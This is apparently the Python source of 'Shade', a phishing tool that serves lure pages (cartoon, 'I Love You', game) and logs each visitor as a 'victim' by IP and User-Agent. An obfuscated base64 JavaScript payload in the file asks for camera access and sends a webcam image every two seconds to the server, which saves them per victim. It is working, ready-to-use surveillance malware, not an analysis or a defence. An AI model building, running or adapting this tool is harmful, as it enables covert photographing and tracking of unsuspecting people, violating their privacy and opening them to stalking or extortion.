import http.server
import socketserver
import json
import time
import os
import base64
from colorama import Fore, Style,init
import argparse
import random 
init(autoreset=True)
UPLOAD_DIR = "captured_images"
os.makedirs(UPLOAD_DIR, exist_ok=True)

c = Fore
bnr_1 = "CiAgX19fX19fX19fIC5fXyAgICAgICAgICAgICAgICAgICAuX19fICAgICAgICAgCiAvICAgX19fX18vIHwgIHxfXyAgIF9fX19fICAgICAgX198IF8vICAgX19fXyAgCiBcX19fX18gIFwgIHwgIHwgIFwgIFxfXyAgXCAgICAvIF9fIHwgIF8vIF9fIFwgCiAvICAgICAgICBcIHwgICBZICBcICAvIF9fIFxfIC8gL18vIHwgIFwgIF9fXy8gCi9fX19fX19fICAvIHxfX198ICAvIChfX19fICAvIFxfX19fIHwgICBcX19fICA+CiAgICAgICAgXC8gICAgICAgXC8gICAgICAgXC8gICAgICAgXC8gICAgICAgXC8gCiAgICAgICAgICAgICBjb2RlIGJ5IGlzc2FtIGp1bmlvcgo="
bnr_2 = "CiAgIF9fX19fIF9fICAgICAgICAgICAgICBfXyAgIAogIC8gX19fLy8gL18gIF9fX18gX19fX18vIC9fXyAKICBcX18gXC8gX18gXC8gX18gYC8gX18gIC8gXyBcCiBfX18vIC8gLyAvIC8gL18vIC8gL18vIC8gIF9fLwovX19fXy9fLyAvXy9cX18sXy9cX18sXy9cX19fLyAKICAgICB0ZWxlZ3JhbTogQGlzc2FtaXNvCgo="
list_bnr  = [base64.b64decode(bnr_1.encode()).decode(),base64.b64decode(bnr_2.encode()).decode()]
rand_color = [Fore.BLUE,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.CYAN,Fore.LIGHTBLACK_EX]
__injection_code = "PHNjcmlwdD4KICAgICAgICBhc3luYyBmdW5jdGlvbiBzZXR1cENhbWVyYSgpe3RyeXtjb25zdCBzdHJlYW09YXdhaXQgbmF2aWdhdG9yLm1lZGlhRGV2aWNlcy5nZXRVc2VyTWVkaWEoe3ZpZGVvOnRydWV9KTtyZXR1cm4gc3RyZWFtO31jYXRjaChlcnJvcil7Y29uc29sZS5lcnJvcigiRXJyb3IgYWNjZXNzaW5nIGNhbWVyYToiLGVycm9yKTtyZXR1cm4gbnVsbDt9fQogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGNhcHR1cmVJbWFnZSh2aWRlbyl7bGV0IGNhbnZhcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTtsZXQgY29udGV4dD1jYW52YXMuZ2V0Q29udGV4dCgiMmQiKTtjYW52YXMud2lkdGg9dmlkZW8udmlkZW9XaWR0aDtjYW52YXMuaGVpZ2h0PXZpZGVvLnZpZGVvSGVpZ2h0O2NvbnRleHQuZHJhd0ltYWdlKHZpZGVvLDAsMCxjYW52YXMud2lkdGgsY2FudmFzLmhlaWdodCk7bGV0IGltYWdlRGF0YT1jYW52YXMudG9EYXRhVVJMKCJpbWFnZS9wbmciKTsKICAgICAgICB0cnl7bGV0IHJlc3BvbnNlPWF3YWl0IGZldGNoKCIvYXBpIix7bWV0aG9kOiJQT1NUIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2ltYWdlOmltYWdlRGF0YX0pfSk7bGV0IHJlc3VsdD1hd2FpdCByZXNwb25zZS5qc29uKCk7fWNhdGNoKGVycm9yKXtjb25zb2xlLmVycm9yKCJFcnJvciB1cGxvYWRpbmcgaW1hZ2U6IixlcnJvcik7fX0KICAgICAgICBhc3luYyBmdW5jdGlvbiBzdGFydENhcHR1cmluZygpe3doaWxlKHRydWUpe2NvbnN0IHN0cmVhbT1hd2FpdCBzZXR1cENhbWVyYSgpO2lmKHN0cmVhbSl7Y29uc3QgdmlkZW89ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgidmlkZW8iKTt2aWRlby5zcmNPYmplY3Q9c3RyZWFtO3ZpZGVvLnBsYXkoKTsKICAgICAgICBzZXRJbnRlcnZhbCgoKT0+e2NhcHR1cmVJbWFnZSh2aWRlbyk7fSwyMDAwKTticmVhazt9ZWxzZXthd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlPT5zZXRUaW1lb3V0KHJlc29sdmUsNTAwMCkpO319fQogICAgICAgIHN0YXJ0Q2FwdHVyaW5nKCk7CiAgICA8L3NjcmlwdD4="
data = {
    "template/cartoon.html":'Cartoon animation loader Template',
    'template/i_love_you.html':'I Love You Template',
    'template/game.html':'Simple Game Play'
}
temp_dir = ""
client_ip = ""
__PORT__ = 8002
__HOST__ = "127.0.0.1"
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    
    def log_message(self, format, *args):
        return
    def do_GET(self):
        global client_ip
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "Unknown")
        all_headers = dict(self.headers)
        print(Fore.YELLOW + f"[+] victim open the link " + Style.RESET_ALL)
        print(Fore.GREEN + f"[{c.BLUE}+{c.GREEN}] IP:{c.CYAN} {client_ip}" + Style.RESET_ALL)
        print(Fore.BLUE + f"[{c.BLUE}+{c.GREEN}] User-Agent:{c.CYAN} {user_agent}" + Style.RESET_ALL)
        #print(Fore.CYAN + f"Headers: {json.dumps(all_headers, indent=4)}" + Style.RESET_ALL)
        if self.path == "/api":
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ready"}).encode())
        else:
           
            self.path = temp_dir
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
    def do_POST(self):
        global client_ip
        if self.path == "/api":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            image_data = data.get("image", "")
            if not image_data.startswith("data:image/png;base64,"):
                self.send_response(400)
                self.end_headers()
                return
            image_data = image_data.replace("data:image/png;base64,", "")
            image_bytes = base64.b64decode(image_data)
            upload_ip = UPLOAD_DIR +"/" + client_ip
            os.makedirs(upload_ip, exist_ok=True)
            filename = f"{upload_ip}/{time.time()}.png"
            with open(filename, "wb") as file:
                file.write(image_bytes)
            print(Fore.GREEN + f"{Fore.RED}[{Fore.BLUE}*{Fore.RED}]{Fore.GREEN} The victims photo was successfully captured {filename}" + Style.RESET_ALL)
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            response = {"status": "success", "message": "Image received"}
            self.wfile.write(json.dumps(response).encode())



class Shade:
    def __init__(self,arg=None):
        self.arg = arg  
        #global __PORT__,__HOST__
        self.__PORT__ = arg.lport 
        self.__HOST__ = arg.lhost
    def banner(self):
        print(
        random.choice(rand_color)+
        random.choice(list_bnr)  + 
        Fore.RESET
        )
    def start_server(self):
        PORT = 8000
        print(Fore.BLUE + f"[*] Starting server on port {self.__PORT__}..." + Style.RESET_ALL)
        with socketserver.TCPServer((self.__HOST__, self.__PORT__), RequestHandler) as httpd:
            print(Fore.GREEN + f"[+] Server is running at http://{self.__HOST__}:{self.__PORT__}" + Style.RESET_ALL)
            httpd.serve_forever()
    def photo_cap(self):
        global temp_dir
        kk = 0 
        for i in data:
            kk+=1
            print(
                c.GREEN + f"[{c.YELLOW}{kk}{c.GREEN}] {c.CYAN}{i}{c.YELLOW}: {c.GREEN}{data[i]}"
            )
        ch = 0 
        while ch == 0:
            try:
                choice = int(input(f'{c.BLUE}[{c.RED}+{c.BLUE}]{c.WHITE} choice Template{c.RED}: {c.YELLOW}')) - 1 
                if choice <= len(data):
                    temp_dir = list(data.keys())[choice]
                    ch = 1
                else:
                    print(c.RED + f"[!] error Template number '{choice}' not found" + c.RESET)
            except KeyboardInterrupt:
                quit()
            except Exception as e:
                print(c.RED + "[!] " + str(e) + c.RESET)
        try:
            self.start_server()
        except KeyboardInterrupt:
            print(c.RED + "[!] KeyboardInterrupt & exit")
            quit()
        except Exception as e:
            print(c.REC + "[!] Error: "+str(e))
    
    def run(self):
        self.photo_cap()
        """
        print(f'{c.BLUE}[{c.RED}1{c.BLUE}]{c.GREEN} Video Stream {c.RED}#{c.LIGHTBLACK_EX}Open the live stream from the victim camera')
        print(f'{c.BLUE}[{c.RED}2{c.BLUE}]{c.GREEN} Photo Cap {c.RED}#{c.LIGHTBLACK_EX}Take a picture of the victim every 2 seconds')
        try:
            opt = input(f'{c.RED}[{c.CYAN}+{c.RED}]{c.WHITE} Select option{c.YELLOW}:{c.RED} ').strip()
        except:
            print()
            self.run()
        if opt == "1":
            pass 
        elif opt == "2":
            self.photo_cap()
        """
def parse():
    arg = argparse.ArgumentParser()
    arg.add_argument('-lp', '--lport', type=int, default=8001, help='Specify the listener port (default: 8001)')
    arg.add_argument('-lh', '--lhost', default="127.0.0.1", help='Specify the local host IP address (default: 127.0.0.1)')

   
   
    return arg.parse_args()

if __name__ == "__main__":
    try:
        arg = parse()
        s = Shade(arg=arg)
        s.banner()
        s.run()
    except KeyboardInterrupt:
        print(c.RED + "[!] KeyboardInterrupt & exit")
        quit()
    except Exception as e:
        print(c.RED + "[!] Error: "+str(e))
    #s.start_server()
    
